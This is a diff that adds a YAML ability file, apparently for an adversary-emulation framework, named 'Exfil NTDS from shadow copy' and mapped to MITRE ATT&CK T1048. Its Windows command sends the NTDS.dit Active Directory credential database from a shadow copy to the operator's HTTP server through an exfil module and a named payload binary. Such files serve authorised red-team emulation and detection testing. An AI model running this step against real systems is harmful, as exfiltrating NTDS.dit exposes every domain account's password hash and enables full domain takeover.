@@ -1,0 +1,19 @@
+id: cb2f7514-fd28-4e46-b6cd-4ae4e06ac871
+name: Exfil NTDS from shadow copy
+description: Exfil the NTDS.dit file from the created shadow copy to Operator using the exfil plugin
+tactic: exfiltration
+technique:
+  id: T1048
+  name: Exfiltration Over Alternative Protocol
+metadata:
+  authors:
+    - w0rk3r
+  tags:
+    - thinktank
+    - custom
+platforms:
+  windows:
+    keyword:
+      command: |
+        module.exfil.httpServer.["http://#{operator.http}", "#{json.T1003.003.SymLink}\\ntds.dit", "#{agent.name}", "#{operator.session}"]
+      payload: '#{operator.payloads}/pneumaEX/exfil/exfil-windows.exe'
